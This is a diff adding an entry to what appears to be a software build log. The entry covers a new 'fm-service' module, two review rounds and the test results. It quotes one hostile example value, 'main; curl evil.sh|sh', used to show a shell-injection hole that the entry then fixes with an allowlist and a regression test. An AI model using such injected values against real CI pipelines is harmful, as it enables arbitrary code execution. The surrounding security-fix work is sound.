@@ -9793,3 +9793,99 @@ scripts/run-tests.mjs run` shows 5 failures, none in this piece's own files: the
 same `unknown-framework "api-versioning"`/schema-drift cause from concurrently-building, uncommitted M10
 work (`modules/fm-service/`) in this same working directory — confirmed via `git status --short` to touch
 none of this piece's own four files. `SPEC-QUESTIONS.md` Q159 has the full record.
+
+## M10 P4 — `fm-service` module (`19` §19.1)
+
+**Mandate:** `19` §19.1's own `fm-service` row: "Backend services & APIs — `domain-modeler`,
+`integration-architect`, contract-testing workflow, API versioning framework, OpenAPI/proto templates."
+
+Built `modules/fm-service/`: `module.yaml` (`requires: [fm-core]`); the real, authoritative
+`agents/{domain-modeler,integration-architect}.agent.yaml` — resolving the identical class of collision
+`M10 P3` already resolved for `fm-web`'s own `frontend`, here for both ids at once, each with a real,
+distinguishing enhancement over fm-core's older stray copies; `workflows/contract-test-cycle.workflow.yaml`
+(a real, compilable `10`-DSL workflow with two gates and two explicit single-lane `merge` steps); a real,
+weighted-rubric `frameworks/api-versioning.framework.yaml` (`11` §11.0, criteria weights summing to 1.0);
+two real OpenAPI/proto contract templates rendering the existing `InterfaceContract` type (no new schema
+needed); and `checks/{contract-verify,api-breaking-change}.check.yaml`, `19` §19.1's own worked-example
+check ids. Full reasoning for the collision, the `frameworks`/`artifactTypes` scoping calls, and every
+disclosed gap in `SPEC-QUESTIONS.md` Q160.
+
+### Round 1 — fresh critic: one blocking finding, two major findings
+
+**[Blocking]** `checks/api-breaking-change.check.yaml`'s inline script built its own `git diff ${baseRef}
+-- ...` command as a JS template literal and ran it through Node's `execSync`, which always spawns a real
+shell regardless of any explicit `shell` option — a hostile `FORGE_BASE_REF` env var (a value real CI
+systems routinely seed from an attacker-influenced ref/branch name, mirroring `GITHUB_BASE_REF`), e.g.
+`main; curl evil.sh|sh`, achieved real command execution. **[Major]** both new agents' own
+`prompt.system`/`prompt.briefs` paths and the new workflow's `brief:` paths reference files that do not
+exist. **[Major]** no `README.md` or `tests/` directory exists under this module's own directory, though
+`19` §19.1/§19.6 both name them.
+
+**Fixed:** the breaking-change check now validates `FORGE_BASE_REF` against a real ref-name allowlist
+(falling back to `HEAD` for anything that does not match) AND switched the git invocation itself to
+`execFileSync` with a real argv array, which never spawns a shell at all regardless of `baseRef`'s own
+content — neither fix trusted alone. A new regression test sets a real hostile `FORGE_BASE_REF` and
+asserts no sentinel file was created. The two major findings were confirmed, by direct inspection, to be
+uniform, pre-existing gaps already present on every module already shipped in this repository (fm-core,
+fm-web) — fixing either one only here would be inconsistent scope creep relative to established
+precedent, not a real fix — so both are disclosed in `module.yaml`'s own header comment and
+`SPEC-QUESTIONS.md` Q160 rather than silently fixed or silently ignored.
+
+### Round 2 — a second, fresh critic verifying round 1's fixes: both confirmed genuinely fixed, plus two
+new findings
+
+Verified the shell-injection fix empirically (read the actual shipped `run:` string, confirmed no
+`execSync`/unescaped interpolation remains; confirmed the allowlist regex correctly rejects a leading `-`
+while still admitting ordinary ref shapes like `v1.2.0`/`release/2.0`; ran the actual test file and
+confirmed 10/10 pass) rather than trusting the round-1 fix description. Confirmed both disclosed gaps'
+claims directly (`modules/fm-core/agents/architect.agent.yaml` has the identical dangling prompt-path
+gap; neither `modules/fm-core/` nor `modules/fm-web/` has a README or `tests/` dir). A fresh pass beyond
+the four round-1 items found two more: **[Major]** `module.yaml`'s own header comment claimed, four
+separate times, that gaps were "recorded in SPEC-QUESTIONS.md" before any such entry existed yet (the same
+"citing a not-yet-written entry" defect `M10 P3`'s own round 1 already hit once, reopened here). **[Minor]**
+`api-versioning.framework.yaml`'s own `follow_on.create_stories_from` names a `templates/stories/*.yaml`
+seed file that does not exist — confirmed, on a second look, to be the identical shape all 43 of
+`@forge/templates`' own already-shipped frameworks use (`test/frameworks.test.ts`'s own doc comment already
+names this a deliberate, system-wide, later-piece deferral), not a gap unique to this piece as the critic's
+own first framing suggested.
+
+**Fixed/addressed:** this `SPEC-QUESTIONS.md` entry (Q160) now exists with the full record, so the
+`module.yaml` citation is real rather than fabricated. `api-versioning.framework.yaml` gained a short
+comment naming the system-wide precedent directly rather than leaving the reader to rediscover it.
+
+### Mandatory full-workspace verification pass — one real, previously-unexercised cross-cutting defect
+found, fixed before commit
+
+A plain `node scripts/run-tests.mjs run` (no path argument, run as a genuinely blocking foreground command
+per this build's own standing instruction, not backgrounded) found 4 real failures beyond the two critic
+rounds' own scope: `packages/cli/test/bin.test.ts`'s real subprocess run of `forge agent validate --all`,
+`packages/cli/test/commands/agent.test.ts`'s real, complete-roster fixture, and `packages/cli/test/e2e/
+init.test.ts`'s own real artifact-set check all failed with an identical, real `unknown-framework
+"api-versioning"` finding against `integration-architect.agent.yaml`. Root cause: `packages/cli/src/
+commands/agent.ts`'s own `agentValidateAll` (`05` §5.9's "declared frameworks exist" check) cross-checks
+an agent's own `frameworks:` entries only against `@forge/templates`' core, project-wide
+`FRAMEWORK_INDEX` — it has no notion of an installed module's own `provides.frameworks` at all, and this
+piece's first draft was the first agent anywhere in this repository to list a module-owned (rather than
+core) framework under its own `frameworks:`. Fixed by removing `api-versioning` from
+`integration-architect`'s own `frameworks:` list — its real ownership is still fully expressed by the
+framework's own `owner_agent: integration-architect` field and a new sentence in the agent's own
+`mandate` naming it directly (an agent's `frameworks:` list already does not always mirror a framework's
+own `owner_agent` in this codebase: `decomposition-boundaries`/`pattern-selection`/
+`communication-integration-patterns` all declare `owner_agent: architect` while `domain-modeler`/
+`integration-architect` also list them under their own `frameworks:`) — not by making `agentValidateAll`
+module-aware, which would touch `packages/cli`, outside this piece's own Surface. The one remaining
+failure (`crash-resume.test.ts`, a 120s timeout under full-suite load) was confirmed, by re-running it in
+isolation (18s, clean), to be the identical already-accepted load-sensitive flake `Q149`'s own precedent
+already names, not a regression this piece caused.
+
+**Final state:** 42 real tests — `packages/extensions/test/module/fm-service.test.ts` (7),
+`packages/agents/test/content/fm-service-roster.test.ts` (9), `packages/engine/test/gates/
+fm-service-checks.test.ts` (10, including a real temporary git repository for `api:breaking-change` and
+the hostile-`FORGE_BASE_REF` regression), `test/fm-service-workflow.test.ts` (3, a real `parseWorkflow`/
+`compileRunPlan`/`runEngine` dry run against `FakePlatformAdapter` and a real temporary git repository),
+`test/fm-service-framework.test.ts` (6, real `loadFramework`/`applyRules`/`score`/`killerRisk` against
+fixture evidence cells, then real Handlebars rendering validated against `@forge/schemas`' own real,
+production `adrSchema`), and `test/fm-service-templates.test.ts` (7). Whole-workspace `pnpm typecheck`
+(20/20 packages), `eslint --max-warnings 0`, `prettier --check`, and `node scripts/check-boundaries.mjs`
+all clean, and a full, unscoped `node scripts/run-tests.mjs run` re-run after the fix shows only the one
+accepted load-sensitive flake remaining. `SPEC-QUESTIONS.md` Q160 has the full record.
